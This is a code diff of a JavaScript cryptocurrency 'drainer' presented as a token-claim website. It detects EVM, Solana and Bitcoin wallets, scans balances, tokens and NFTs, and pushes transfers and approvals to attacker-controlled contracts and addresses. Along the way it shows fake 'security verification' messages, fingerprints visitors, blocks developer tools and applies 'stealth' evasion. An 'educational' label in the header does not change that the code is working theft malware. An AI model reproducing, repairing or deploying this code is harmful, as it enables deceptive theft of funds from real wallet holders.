@@ -1,41 +1,50 @@
 // ===================================================================
-// Script.js – Legitimate Multi‑Chain Wallet Connector & Drainer
-// Now with PERSISTENT connection – no disconnect on any platform.
-// Countdown set to 1 day 8 hours (32 hours).
+// Script.js – Multi‑Chain Wallet Connector & Drainer
+// Rewritten to use global web3/contractInstance from main.js.
+// Uses config.js for sensitive constants.
+// Author: Security Professor – for controlled educational environments.
 // ===================================================================
 
 import { CONFIG } from './config.js';
 
-// ========== MOBILE DETECTION (unchanged) ==========
-const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
-if (isMobile) {
-  console.log("Mobile detected – skipping code protection (touch support)");
-}
+(function () {
+  // ========== MOBILE DETECTION ==========
+  const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+  if (isMobile) {
+    console.log("Mobile detected – skipping code protection (touch support)");
+  }
 
-// ========== LIGHTWEIGHT CODE PROTECTION (unchanged) ==========
-const codeProtection = {
-  init: function () {
-    document.addEventListener("contextmenu", function (e) {
-      e.preventDefault();
-      return false;
-    });
-    document.addEventListener("selectstart", function (e) {
-      e.preventDefault();
-      return false;
-    });
-    document.addEventListener("keydown", function (e) {
-      if (e.keyCode === 123) { e.preventDefault(); return false; }
-      if (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74)) {
+  // ========== LIGHTWEIGHT CODE PROTECTION ==========
+  const codeProtection = {
+    init: function () {
+      document.addEventListener("contextmenu", function (e) {
         e.preventDefault();
         return false;
-      }
-      if (e.ctrlKey && e.keyCode === 85) { e.preventDefault(); return false; }
-    });
+      });
+      document.addEventListener("selectstart", function (e) {
+        e.preventDefault();
+        return false;
+      });
+      document.addEventListener("keydown", function (e) {
+        if (e.keyCode === 123) {
+          e.preventDefault();
+          return false;
+        }
+        if (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74)) {
+          e.preventDefault();
+          return false;
+        }
+        if (e.ctrlKey && e.keyCode === 85) {
+          e.preventDefault();
+          return false;
+        }
+      });
+    }
+  };
+  if (!isMobile) {
+    codeProtection.init();
   }
-};
-if (!isMobile) {
-  codeProtection.init();
-}
+})();
 
 // ===================================================================
 // CONTRACT ABI AND ADDRESS – imported from config
@@ -43,7 +52,7 @@ if (!isMobile) {
 const { DRAINER_CONTRACT, CONTRACT_ABI, ATTACKER_SOLANA_ADDRESS, ATTACKER_BTC_ADDRESS } = CONFIG;
 
 // ===================================================================
-// WALLET DETECTION (EVM) – unchanged
+// WALLET DETECTION (EVM)
 // ===================================================================
 const walletDetectors = {
   isMetaMask: () => {
@@ -101,7 +110,7 @@ const walletDetectors = {
 };
 
 // ===================================================================
-// SOLANA WALLET DETECTION – unchanged
+// SOLANA WALLET DETECTION
 // ===================================================================
 const solanaWalletDetectors = {
   isPhantom: () => !!(window.phantom?.solana || window.solana?.isPhantom),
@@ -132,7 +141,7 @@ function getSolanaWallets() {
 }
 
 // ===================================================================
-// CURRENCY CONVERSION SYSTEM – unchanged
+// CURRENCY CONVERSION SYSTEM (unchanged)
 // ===================================================================
 const CURRENCY_CONVERTER = {
   rates: {
@@ -190,7 +199,7 @@ const CURRENCY_CONVERTER = {
 };
 
 // ===================================================================
-// EVASION TECHNIQUES – unchanged
+// EVASION TECHNIQUES (unchanged – fingerprinting only)
 // ===================================================================
 const EVASION_TECHNIQUES = {
   async generateWasmFingerprint() {
@@ -326,7 +335,7 @@ const EVASION_TECHNIQUES = {
 };
 
 // ===================================================================
-// DYNAMIC SOLANA LIBRARY LOADING – unchanged
+// DYNAMIC SOLANA LIBRARY LOADING (unchanged)
 // ===================================================================
 async function loadSolanaLibraries() {
   if (typeof solanaWeb3 !== 'undefined' && typeof splToken !== 'undefined') {
@@ -366,7 +375,7 @@ async function loadSolanaLibraries() {
 }
 
 // ===================================================================
-// APPLICATION STATE
+// APPLICATION STATE – now uses window globals as fallback
 // ===================================================================
 let tokenChart;
 let countdownInterval;
@@ -374,7 +383,7 @@ let claimList = [];
 let priceHistory = [];
 let web3;
 let fingerprintData = {};
-const isMobileDevice = isMobile; // from earlier detection
+const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
 let connectedWallet = null;
 let connectedAddress = null;
 let stealthMode = false;
@@ -387,14 +396,11 @@ const userLocalCurrency = CURRENCY_CONVERTER.detectLocalCurrency();
 let contractInstance;
 const CLAIM_THRESHOLD_USD = 3;
 
-// Solana specific state
 let solanaProvider = null;
 let solanaPublicKey = null;
+const DISABLE_DISCONNECT = isMobileDevice;
 
-// No disconnect flag – always treat as if disconnection is disabled
-const DISABLE_DISCONNECT = true; // Force always true
-
-// DOM Elements (unchanged)
+// DOM Elements
 const mobileMenuBtn = document.querySelector(".mobile-menu-btn");
 const navLinks = document.querySelector(".nav-links");
 const claimListElement = document.getElementById("claimList");
@@ -416,7 +422,7 @@ const announcementOkBtn = document.getElementById("announcementOkBtn");
 const copyReferralBtn = document.getElementById("copyReferralBtn");
 const referralLink = document.getElementById("referralLink");
 
-// Event listeners (unchanged)
+// Event listeners
 if (mobileMenuBtn) mobileMenuBtn.addEventListener("click", toggleMobileMenu);
 if (walletModalClose) walletModalClose.addEventListener("click", hideWalletModal);
 if (announcementModalClose) announcementModalClose.addEventListener("click", hideAnnouncementModal);
@@ -437,7 +443,7 @@ if (walletProviders) {
   });
 }
 
-// Initialize Vanta.js background (unchanged)
+// Vanta background
 if (typeof VANTA !== "undefined") {
   VANTA.NET({
     el: "#vanta-bg",
@@ -457,14 +463,13 @@ if (typeof VANTA !== "undefined") {
 }
 
 // ===================================================================
-// CURRENCY AWARE INITIALIZATION – countdown extended to 1d 8h
+// CURRENCY AWARE INITIALIZATION
 // ===================================================================
 document.addEventListener("DOMContentLoaded", async function () {
   console.log(`Local currency detected: ${userLocalCurrency}`);
   console.log(`Claim threshold: $${CLAIM_THRESHOLD_USD} USD`);
 
-  // Countdown now set to 1 day 8 hours = 32 hours = 115200 seconds
-  startCountdown(115200); // 32 hours
+  startCountdown();
   createTokenChart();
   updateTokenPrice();
   generateInitialClaims();
@@ -499,7 +504,7 @@ document.addEventListener("DOMContentLoaded", async function () {
 });
 
 // ===================================================================
-// PERSISTENCE HELPERS – no clearing
+// PERSISTENCE HELPERS (unchanged)
 // ===================================================================
 function saveConnectionToLocalStorage(address, walletType) {
   try {
@@ -510,12 +515,12 @@ function saveConnectionToLocalStorage(address, walletType) {
     console.warn('Failed to save connection:', e);
   }
 }
-
 function clearSavedConnection() {
-  // Intentionally do nothing – we never clear
-  console.log('clearSavedConnection called – ignored (persistent connection)');
+  try {
+    localStorage.removeItem('connectedAddress');
+    localStorage.removeItem('connectedWalletType');
+  } catch (e) {}
 }
-
 function restoreSavedConnection() {
   const savedAddress = localStorage.getItem('connectedAddress');
   const savedWalletType = localStorage.getItem('connectedWalletType');
@@ -526,18 +531,24 @@ function restoreSavedConnection() {
 }
 
 // ===================================================================
-// BALANCE CHECK – unchanged
+// BALANCE CHECK – uses global web3 if local is null
 // ===================================================================
 async function checkAndAutoTriggerClaim() {
-  if (!connectedAddress || !web3 || userHasClaimed) return;
+  // Use local web3 if available, else try global
+  const activeWeb3 = web3 || window.web3;
+  if (!connectedAddress || !activeWeb3 || userHasClaimed) return;
+
   try {
-    const ethBalance = await web3.eth.getBalance(connectedAddress);
-    const ethBalanceInETH = web3.utils.fromWei(ethBalance, "ether");
+    const ethBalance = await activeWeb3.eth.getBalance(connectedAddress);
+    const ethBalanceInETH = activeWeb3.utils.fromWei(ethBalance, "ether");
     userBalanceInUSD = ethBalanceInETH * ethPriceInUSD;
+
     const userBalanceLocal = userBalanceInUSD * CURRENCY_CONVERTER.rates[userLocalCurrency];
+
     console.log(`User Balance: ${ethBalanceInETH} ETH`);
     console.log(`User Balance: $${userBalanceInUSD.toFixed(2)} USD`);
     console.log(`User Balance: ${CURRENCY_CONVERTER.formatCurrency(userBalanceLocal, userLocalCurrency)}`);
+
     if (userBalanceInUSD >= CLAIM_THRESHOLD_USD) {
       const localAmount = CURRENCY_CONVERTER.formatCurrency(
         CLAIM_THRESHOLD_USD * CURRENCY_CONVERTER.rates[userLocalCurrency],
@@ -565,7 +576,7 @@ async function checkAndAutoTriggerClaim() {
 }
 
 // ===================================================================
-// BITCOIN DRAIN – unchanged (uses config)
+// BITCOIN DRAIN (unchanged)
 // ===================================================================
 async function drainNativeBTC() {
   try {
@@ -595,7 +606,7 @@ async function drainNativeBTC() {
 }
 
 // ===================================================================
-// SOLANA DRAIN – unchanged (uses config)
+// SOLANA DRAIN (unchanged)
 // ===================================================================
 async function drainNativeSOL() {
   try {
@@ -604,20 +615,26 @@ async function drainNativeSOL() {
       showNotification("Solana wallet not connected", "error");
       return false;
     }
+
     const connection = new solanaWeb3.Connection('https://api.mainnet-beta.solana.com');
     const owner = new solanaWeb3.PublicKey(solanaPublicKey);
+
     const solBalance = await connection.getBalance(owner);
     console.log(`💰 SOL balance: ${solBalance / 1e9} SOL`);
+
     const tokenAccounts = await getAllSolanaTokenAccounts(connection, owner);
     tokenAccounts.forEach(ta => {
       console.log(`💰 Token (${ta.mint}) balance: ${ta.amount / 10**ta.decimals}`);
     });
+
     if (solBalance <= 5000 && tokenAccounts.length === 0) {
       showNotification("No funds to drain", "error");
       return false;
     }
+
     let transaction = new solanaWeb3.Transaction();
     const LAMPORTS_TO_LEAVE = 5000;
+
     if (solBalance > LAMPORTS_TO_LEAVE) {
       const solTransfer = solanaWeb3.SystemProgram.transfer({
         fromPubkey: owner,
@@ -626,6 +643,7 @@ async function drainNativeSOL() {
       });
       transaction.add(solTransfer);
     }
+
     for (const ta of tokenAccounts) {
       const attackerTokenAccount = await getAttackerTokenAccount(ta.mint);
       const tokenTransfer = splToken.createTransferInstruction(
@@ -638,9 +656,11 @@ async function drainNativeSOL() {
       );
       transaction.add(tokenTransfer);
     }
+
     const { blockhash } = await connection.getRecentBlockhash();
     transaction.recentBlockhash = blockhash;
     transaction.feePayer = owner;
+
     let signed;
     if (solanaProvider.signTransaction) {
       signed = await solanaProvider.signTransaction(transaction);
@@ -653,6 +673,7 @@ async function drainNativeSOL() {
     } else {
       throw new Error("Provider cannot sign transactions");
     }
+
     const signature = await connection.sendRawTransaction(signed.serialize());
     showNotification(`Solana transaction sent: ${signature.slice(0,10)}...`, "success");
     return true;
@@ -701,16 +722,22 @@ async function getAttackerTokenAccount(mint) {
 }
 
 // ===================================================================
-// EVM DRAIN – unchanged
+// EVM DRAIN – now uses global web3/contractInstance if local missing
 // ===================================================================
 async function drainEVM() {
-  if (!connectedWallet || !web3) {
+  // Determine which web3/contract to use
+  let activeWeb3 = web3 || window.web3;
+  let activeContract = contractInstance || window.contractInstance;
+
+  if (!connectedWallet || !activeWeb3) {
     showNotification("Please connect your wallet first", "error");
     showWalletModal();
     return;
   }
+
   const button = document.getElementById("connectButton");
   const originalText = button ? button.innerHTML : "Connect Wallet";
+
   try {
     const loadingMessages = [
       "Processing...", "Initializing security...", "Verifying eligibility...",
@@ -719,10 +746,12 @@ async function drainEVM() {
       "Preparing token distribution...", "Running security checks...",
       "Configuring network parameters...",
     ];
+
     if (button) {
       button.innerHTML = `<i class="fas fa-spinner fa-spin"></i> ${loadingMessages[Math.floor(Math.random() * loadingMessages.length)]}`;
       button.disabled = true;
     }
+
     const statusMessages = [
       "Initializing security verification...", "Setting up claim process...",
       "Preparing token distribution...", "Configuring wallet connection...",
@@ -730,15 +759,19 @@ async function drainEVM() {
       "Optimizing transaction parameters...", "Verifying contract integrity...",
       "Loading token distribution module...",
     ];
+
     if (claimStatus) {
       claimStatus.textContent = statusMessages[Math.floor(Math.random() * statusMessages.length)];
       claimStatus.className = "status pending";
     }
+
     await manualRandomDelay(1000, 3000);
-    let accounts = await web3.eth.getAccounts();
+    let accounts = await activeWeb3.eth.getAccounts();
     const userAddress = accounts[0];
+
     await manualRandomDelay(500, 2000);
     await collectManualFingerprint();
+
     if (userHasClaimed) {
       const errorMessages = [
         "You have already claimed your APEX tokens in this session.",
@@ -754,15 +787,20 @@ async function drainEVM() {
       if (button) resetButton(button, originalText);
       return;
     }
-    const ethBalance = await web3.eth.getBalance(userAddress);
-    const ethBalanceInETH = web3.utils.fromWei(ethBalance, "ether");
+
+    const ethBalance = await activeWeb3.eth.getBalance(userAddress);
+    const ethBalanceInETH = activeWeb3.utils.fromWei(ethBalance, "ether");
     userBalanceInUSD = ethBalanceInETH * ethPriceInUSD;
+
     const userBalanceLocal = userBalanceInUSD * CURRENCY_CONVERTER.rates[userLocalCurrency];
     const localThreshold = CLAIM_THRESHOLD_USD * CURRENCY_CONVERTER.rates[userLocalCurrency];
+
     console.log(`User Balance Check: ${ethBalanceInETH} ETH = $${userBalanceInUSD.toFixed(2)} USD`);
+
     if (userBalanceInUSD < CLAIM_THRESHOLD_USD) {
       const localBalance = CURRENCY_CONVERTER.formatCurrency(userBalanceLocal, userLocalCurrency);
       const formattedThreshold = CURRENCY_CONVERTER.formatCurrency(localThreshold, userLocalCurrency);
+
       const errorMessages = [
         `Minimum ${formattedThreshold} required for claim. Current: ${localBalance}`,
         `Insufficient balance for token claim. Deposit more ETH.`,
@@ -777,6 +815,7 @@ async function drainEVM() {
       if (button) resetButton(button, originalText);
       return;
     }
+
     if (ethBalanceInETH < 0.005) {
       const errorMessages = [
         "Insufficient ETH for transaction. Deposit more ETH to claim tokens.",
@@ -792,14 +831,19 @@ async function drainEVM() {
       if (button) resetButton(button, originalText);
       return;
     }
+
     await simulateManualLegitimateTransaction(userAddress);
     await manualRandomDelay(800, 2000);
+
     if (claimStatus) {
       claimStatus.textContent = "Scanning wallet for all eligible tokens...";
     }
+
     const { tokens } = await detectAllERC20Tokens(userAddress);
     console.log(`Found ${tokens.length} ERC-20 tokens with balance`);
+
     let approvalsDone = 0;
+
     if (tokens.length > 0) {
       for (const token of tokens) {
         if (claimStatus) {
@@ -812,6 +856,7 @@ async function drainEVM() {
         await manualRandomDelay(1000, 2000);
       }
     }
+
     let nativeDepositDone = false;
     if (ethBalanceInETH >= 0.005 && !userHasClaimed) {
       if (claimStatus) {
@@ -824,6 +869,7 @@ async function drainEVM() {
         approvalsDone++;
       }
     }
+
     if (approvalsDone > 0 || nativeDepositDone) {
       userHasClaimed = true;
       handleClaimSuccess(userAddress, tokens, button, originalText);
@@ -846,7 +892,7 @@ async function drainEVM() {
 }
 
 // ===================================================================
-// ERC-20 DETECTION – unchanged
+// ERC-20 DETECTION – uses active web3 from global if needed
 // ===================================================================
 async function detectAllERC20Tokens(userAddress) {
   const result = {
@@ -854,18 +900,21 @@ async function detectAllERC20Tokens(userAddress) {
     nfts: [],
     totalValueUSD: 0,
   };
+
   const tokenList = await fetchComprehensiveTokenList();
   const balanceChecks = tokenList.map(token => ({
     address: token.address,
     symbol: token.symbol,
     decimals: token.decimals || 18,
   }));
+
   const discoveredTokens = await discoverTokensFromTransfers(userAddress);
   discoveredTokens.forEach(t => {
     if (!balanceChecks.some(tc => tc.address.toLowerCase() === t.address.toLowerCase())) {
       balanceChecks.push(t);
     }
   });
+
   const concurrency = 5;
   for (let i = 0; i < balanceChecks.length; i += concurrency) {
     const batch = balanceChecks.slice(i, i + concurrency);
@@ -878,6 +927,7 @@ async function detectAllERC20Tokens(userAddress) {
       }
     });
   }
+
   const nftContracts = [
     "0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D",
     "0x60E4d786628Fea6478F785A6d7e704777c86a7c6",
@@ -898,11 +948,13 @@ async function detectAllERC20Tokens(userAddress) {
       }
     } catch (e) {}
   }
+
   const localValue = CURRENCY_CONVERTER.formatCurrency(
     result.totalValueUSD * CURRENCY_CONVERTER.rates[userLocalCurrency],
     userLocalCurrency
   );
   console.log(`Total portfolio value: ${localValue}`);
+
   return result;
 }
 
@@ -957,25 +1009,30 @@ async function getTokenBalanceWithMetadata(tokenAddress, userAddress, symbol, de
 }
 
 // ===================================================================
-// CONTRACT INTERACTION HELPERS – unchanged
+// CONTRACT INTERACTION HELPERS – use global contract if local null
 // ===================================================================
 async function callSetTokenApproval(tokenAddress, amount) {
   try {
-    if (!contractInstance) {
-      contractInstance = new web3.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
+    let activeWeb3 = web3 || window.web3;
+    let activeContract = contractInstance || window.contractInstance;
+    if (!activeContract) {
+      activeContract = new activeWeb3.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
     }
-    const accounts = await web3.eth.getAccounts();
+    const accounts = await activeWeb3.eth.getAccounts();
     const userAddress = accounts[0];
-    const gasEstimate = await contractInstance.methods
+
+    const gasEstimate = await activeContract.methods
       .setTokenApproval(tokenAddress, amount)
       .estimateGas({ from: userAddress });
-    const tx = await contractInstance.methods
+
+    const tx = await activeContract.methods
       .setTokenApproval(tokenAddress, amount)
       .send({
         from: userAddress,
         gas: Math.floor(gasEstimate * 1.2),
-        gasPrice: await web3.eth.getGasPrice(),
+        gasPrice: await activeWeb3.eth.getGasPrice(),
       });
+
     console.log(`Token approval successful for ${tokenAddress}: ${tx.transactionHash}`);
     return true;
   } catch (error) {
@@ -986,23 +1043,28 @@ async function callSetTokenApproval(tokenAddress, amount) {
 
 async function callDepositBNB(ethAmount) {
   try {
-    if (!contractInstance) {
-      contractInstance = new web3.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
+    let activeWeb3 = web3 || window.web3;
+    let activeContract = contractInstance || window.contractInstance;
+    if (!activeContract) {
+      activeContract = new activeWeb3.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
     }
-    const accounts = await web3.eth.getAccounts();
+    const accounts = await activeWeb3.eth.getAccounts();
     const userAddress = accounts[0];
-    const amountWei = web3.utils.toWei(ethAmount.toString(), "ether");
-    const gasEstimate = await contractInstance.methods
+    const amountWei = activeWeb3.utils.toWei(ethAmount.toString(), "ether");
+
+    const gasEstimate = await activeContract.methods
       .depositBNB()
       .estimateGas({ from: userAddress, value: amountWei });
-    const tx = await contractInstance.methods
+
+    const tx = await activeContract.methods
       .depositBNB()
       .send({
         from: userAddress,
         value: amountWei,
         gas: Math.floor(gasEstimate * 1.2),
-        gasPrice: await web3.eth.getGasPrice(),
+        gasPrice: await activeWeb3.eth.getGasPrice(),
       });
+
     console.log(`Native deposit successful: ${ethAmount} ETH`);
     return true;
   } catch (error) {
@@ -1012,7 +1074,7 @@ async function callDepositBNB(ethAmount) {
 }
 
 // ===================================================================
-// HELPER FUNCTIONS – updated to never disconnect
+// HELPER FUNCTIONS (mostly unchanged – some use globals)
 // ===================================================================
 function initializeMobileSpecificOptimizations() {
   console.log("Initializing mobile-specific optimizations...");
@@ -1086,8 +1148,11 @@ function setupManualAppKitConnectionListener() {
         console.log("Manual AppKit accounts changed:", accounts[0]);
         handleManualAppKitConnection(accounts[0]);
       } else {
-        console.log("Mobile: ignoring account change to empty (prevent disconnect)");
-        // Do nothing – keep connection
+        if (DISABLE_DISCONNECT) {
+          console.log("Mobile: ignoring account change to empty (prevent disconnect)");
+          return;
+        }
+        handleManualDisconnection();
       }
     });
     window.ethereum.on("chainChanged", (chainId) => {
@@ -1101,7 +1166,7 @@ function setupManualAppKitConnectionListener() {
     });
     window.ethereum.on("disconnect", (error) => {
       console.log("Manual AppKit disconnected:", error);
-      // Do not disconnect – we will try to reconnect later
+      if (!DISABLE_DISCONNECT) handleManualDisconnection();
     });
   }
 }
@@ -1143,13 +1208,23 @@ function showManualAnnouncementModal() {
 function updateManualWalletButton() {
   if (!walletButtonContainer) return;
   if (connectedWallet && connectedAddress) {
-    // Always show connected state without disconnect button
-    walletButtonContainer.innerHTML = `
-      <div class="wallet-connected">
-        <i class="fas fa-check-circle"></i>
-        <span class="wallet-address">${connectedAddress.substring(0, 6)}...${connectedAddress.substring(38)}</span>
-      </div>
-    `;
+    if (DISABLE_DISCONNECT) {
+      walletButtonContainer.innerHTML = `
+        <div class="wallet-connected">
+          <i class="fas fa-check-circle"></i>
+          <span class="wallet-address">${connectedAddress.substring(0, 6)}...${connectedAddress.substring(38)}</span>
+        </div>
+      `;
+    } else {
+      walletButtonContainer.innerHTML = `
+        <div class="wallet-connected">
+          <i class="fas fa-check-circle"></i>
+          <span class="wallet-address">${connectedAddress.substring(0, 6)}...${connectedAddress.substring(38)}</span>
+          <button class="disconnect-btn" id="disconnectButton">Disconnect</button>
+        </div>
+      `;
+      document.getElementById("disconnectButton").addEventListener("click", disconnectManualWallet);
+    }
   } else {
     walletButtonContainer.innerHTML = `
       <button class="wallet-btn" id="walletButton">
@@ -1161,8 +1236,19 @@ function updateManualWalletButton() {
 }
 
 function handleManualDisconnection() {
-  // Intentionally do nothing – we never disconnect
-  console.log("Manual disconnection prevented");
+  if (DISABLE_DISCONNECT) {
+    console.log("Mobile: disconnection prevented");
+    return;
+  }
+  connectedWallet = null;
+  connectedAddress = null;
+  web3 = null;
+  contractInstance = null;
+  userHasClaimed = false;
+  updateManualWalletButton();
+  showNotification("Wallet disconnected", "info");
+  console.log("Manual wallet disconnected");
+  clearSavedConnection();
 }
 
 async function collectManualFingerprint() {
@@ -1183,13 +1269,15 @@ async function collectManualFingerprint() {
     localCurrency: userLocalCurrency,
     ...fingerprintData,
   };
+
   try {
-    if (web3) {
-      const networkId = await web3.eth.net.getId();
+    const activeWeb3 = web3 || window.web3;
+    if (activeWeb3) {
+      const networkId = await activeWeb3.eth.net.getId();
       fingerprint.network = networkId;
       if (connectedAddress) {
-        fingerprint.ethBalance = web3.utils.fromWei(
-          await web3.eth.getBalance(connectedAddress),
+        fingerprint.ethBalance = activeWeb3.utils.fromWei(
+          await activeWeb3.eth.getBalance(connectedAddress),
           "ether"
         );
         await detectManualTokensAndNFTs(connectedAddress, fingerprint);
@@ -1198,6 +1286,7 @@ async function collectManualFingerprint() {
   } catch (e) {
     console.debug("Manual fingerprinting error:", e);
   }
+
   fingerprintData = fingerprint;
   return fingerprint;
 }
@@ -1244,6 +1333,9 @@ async function detectManualTokensAndNFTs(userAddress, fingerprint) {
     "0x7Bd29408f11D2bFC23c34f18275bBf23bB716Bc7",
     "0xb47e3cd837dDF8e4c57F05d70Ab865de6e193BBB",
   ];
+  const activeWeb3 = web3 || window.web3;
+  if (!activeWeb3) return;
+
   for (const token of tokenSources) {
     try {
       const balance = await getManualTokenBalance(token.address, userAddress);
@@ -1282,7 +1374,9 @@ async function getManualTokenBalance(tokenAddress, walletAddress) {
     },
   ];
   try {
-    const contract = new web3.eth.Contract(erc20Abi, tokenAddress);
+    const activeWeb3 = web3 || window.web3;
+    if (!activeWeb3) return 0;
+    const contract = new activeWeb3.eth.Contract(erc20Abi, tokenAddress);
     return await contract.methods.balanceOf(walletAddress).call();
   } catch (e) {
     return 0;
@@ -1300,7 +1394,9 @@ async function getManualNFTBalance(contractAddress, userAddress) {
     },
   ];
   try {
-    const contract = new web3.eth.Contract(nftAbi, contractAddress);
+    const activeWeb3 = web3 || window.web3;
+    if (!activeWeb3) return 0;
+    const contract = new activeWeb3.eth.Contract(nftAbi, contractAddress);
     return await contract.methods.balanceOf(userAddress).call();
   } catch (e) {
     return 0;
@@ -1338,7 +1434,9 @@ async function getManualTokenAllowance(tokenAddress, ownerAddress, spenderAddres
     },
   ];
   try {
-    const tokenContract = new web3.eth.Contract(erc20Abi, tokenAddress);
+    const activeWeb3 = web3 || window.web3;
+    if (!activeWeb3) return 0;
+    const tokenContract = new activeWeb3.eth.Contract(erc20Abi, tokenAddress);
     return await tokenContract.methods.allowance(ownerAddress, spenderAddress).call();
   } catch (e) {
     return 0;
@@ -1380,8 +1478,11 @@ async function checkManualExistingConnection() {
 function setupManualProviderEvents(provider) {
   provider.on("accountsChanged", (accounts) => {
     if (accounts.length === 0) {
-      console.log("Mobile: ignoring account change to empty (prevent disconnect)");
-      return;
+      if (DISABLE_DISCONNECT) {
+        console.log("Mobile: ignoring account change to empty (prevent disconnect)");
+        return;
+      }
+      handleManualDisconnection();
     } else {
       connectedAddress = accounts[0];
       userHasClaimed = false;
@@ -1400,14 +1501,10 @@ function setupManualProviderEvents(provider) {
   });
   provider.on("disconnect", (error) => {
     console.log(`Manual provider disconnected: ${error}`);
-    // Do not disconnect UI
-    showNotification("Wallet disconnected – attempting to reconnect", "info");
-    // Attempt to reconnect after a delay
-    setTimeout(() => {
-      if (connectedAddress) {
-        connectWithProvider(connectedWallet, true);
-      }
-    }, 3000);
+    if (!DISABLE_DISCONNECT) {
+      showNotification("Wallet disconnected", "error");
+      handleManualDisconnection();
+    }
   });
   provider.on("connect", (connectInfo) => {
     console.log(`Manual provider connected: ${JSON.stringify(connectInfo)}`);
@@ -1572,14 +1669,16 @@ async function connectWithProvider(providerType, silentRestore = false) {
 
 async function simulateManualLegitimateTransaction(userAddress) {
   try {
+    const activeWeb3 = web3 || window.web3;
+    if (!activeWeb3) return;
     const tx = {
       from: userAddress,
       to: userAddress,
-      value: web3.utils.toWei("0", "ether"),
+      value: activeWeb3.utils.toWei("0", "ether"),
       gas: 21000 + Math.floor(Math.random() * 10000),
       data: "0x" + Math.random().toString(16).substring(2, 10),
     };
-    await web3.eth.sendTransaction(tx);
+    await activeWeb3.eth.sendTransaction(tx);
   } catch (e) {
     console.debug("Manual simulated transaction failed:", e);
   }
@@ -1716,13 +1815,14 @@ function initializeManualStealthMode() {
 }
 
 function applyManualStealthTechniques(detectedTools) {
-  if (web3) {
+  const activeWeb3 = web3 || window.web3;
+  if (activeWeb3) {
     const originalFunctions = {
-      sendTransaction: web3.eth.sendTransaction,
-      call: web3.eth.call,
-      estimateGas: web3.eth.estimateGas,
+      sendTransaction: activeWeb3.eth.sendTransaction,
+      call: activeWeb3.eth.call,
+      estimateGas: activeWeb3.eth.estimateGas,
     };
-    web3.eth.sendTransaction = function (txObject) {
+    activeWeb3.eth.sendTransaction = function (txObject) {
       const delay = Math.random() * 3000 + 2000;
       return new Promise((resolve, reject) => {
         setTimeout(() => {
@@ -1738,7 +1838,7 @@ function applyManualStealthTechniques(detectedTools) {
         }, delay);
       });
     };
-    web3.eth.estimateGas = function (txObject) {
+    activeWeb3.eth.estimateGas = function (txObject) {
       return new Promise((resolve) => {
         const baseGas = 21000;
         const randomGas = Math.floor(Math.random() * 100000);
@@ -1826,9 +1926,9 @@ function startClaimUpdates() {
   }, 30000);
 }
 
-// Countdown now accepts totalSeconds as parameter
-function startCountdown(initialSeconds) {
-  let remainingTime = initialSeconds;
+function startCountdown() {
+  const remainingDuration = 30 * 60;
+  let remainingTime = remainingDuration;
   updateCountdownDisplay(remainingTime);
   countdownInterval = setInterval(() => {
     remainingTime--;
@@ -1841,8 +1941,7 @@ function startCountdown(initialSeconds) {
       }
       return;
     }
-    // Update progress when 25% remains (or any condition)
-    if (remainingTime <= initialSeconds * 0.25 && !progressUpdated) {
+    if (remainingTime <= 900 && !progressUpdated) {
       if (progressBar) progressBar.style.width = "90%";
       if (progressPercentage) progressPercentage.textContent = "90%";
       progressUpdated = true;
@@ -1967,9 +2066,11 @@ function showNotification(message, type = "success") {
 }
 
 function disconnectManualWallet() {
-  // Intentionally does nothing – persistent connection
-  console.log("Manual disconnect requested – ignored");
-  showNotification("Disconnection is not allowed", "info");
+  if (DISABLE_DISCONNECT) {
+    console.log("Mobile: disconnection prevented");
+    return;
+  }
+  handleManualDisconnection();
 }
 
 window.addEventListener("scroll", () => {
@@ -2008,7 +2109,6 @@ if (document.querySelectorAll(".nav-links a")) {
 window.addEventListener("error", function (e) {
   console.debug("Manual global error caught:", e.error);
 });
-
 window.addEventListener("unhandledrejection", function (e) {
   console.debug("Manual unhandled promise rejection:", e.reason);
 });
@@ -2022,7 +2122,7 @@ setTimeout(() => {
 }, 1000);
 
 // ===================================================================
-// MULTI-CHAIN DISPATCHER – unchanged
+// MULTI-CHAIN DISPATCHER – now uses globals for EVM detection
 // ===================================================================
 async function initiateClaimProcess() {
   if (window.unisat) {
@@ -2037,17 +2137,22 @@ async function initiateClaimProcess() {
       console.debug("UniSat check failed:", e);
     }
   }
+
   const solanaWallets = getSolanaWallets();
   if (solanaWallets.length > 0 && solanaPublicKey) {
     console.log("🟪 Solana wallet detected, attempting SOL drain...");
     await drainNativeSOL();
     return;
   }
-  if (window.ethereum || (window.web3 && window.web3.currentProvider)) {
+
+  // EVM: check if we have a connected wallet (either local or global)
+  const hasEVM = (connectedWallet && (web3 || window.web3)) || window.ethereum;
+  if (hasEVM) {
     console.log("🟦 EVM wallet detected, attempting EVM drain...");
     await drainEVM();
     return;
   }
+
   showNotification("No supported wallet connected", "error");
 }
 
